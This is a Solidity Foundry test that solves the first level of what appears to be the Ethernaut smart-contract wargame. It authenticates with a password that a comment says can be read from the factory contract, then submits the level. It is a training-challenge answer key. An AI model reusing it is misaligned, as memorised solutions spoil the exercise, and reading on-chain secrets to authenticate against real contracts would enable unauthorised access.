// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IInstance {
  function authenticate(string memory passkey) external;
}

contract HelloTest is Test {
  Utils internal utils;
  address internal challengeAddress;
  IInstance internal challenge;

  function setUp() public {
    utils = new Utils();
    challengeAddress = utils.createLevelInstance(0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966);
    challenge = IInstance(challengeAddress);
  }

  function testExploit() public {
    // password can be observed from the factory contract
    challenge.authenticate("ethernaut0");

    utils.submitLevelInstance(challengeAddress);
  }
}
